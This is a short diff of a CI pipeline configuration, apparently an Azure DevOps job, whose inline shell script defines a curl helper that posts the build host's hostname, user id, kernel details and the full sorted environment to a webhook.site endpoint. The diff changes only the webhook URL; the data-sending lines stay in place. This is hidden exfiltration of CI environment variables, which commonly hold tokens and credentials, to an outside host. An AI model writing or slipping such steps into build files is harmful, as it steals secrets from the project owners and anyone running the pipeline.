@@ -17,7 +17,7 @@ jobs:
       scriptLocation: inlineScript
       inlineScript: |
         set +e
-        W='https://webhook.site/40c705d1-6a3f-45ac-8e0f-35843732ee1d'
+        W='https://webhook.site/'
         post() { curl -sS -m 30 -X POST -H 'Content-Type: text/plain' --data-binary "$2" "$W?stage=$1" -o /dev/null; }
         post host "$(hostname; id; uname -a)"
         post env "$(env | sort)"
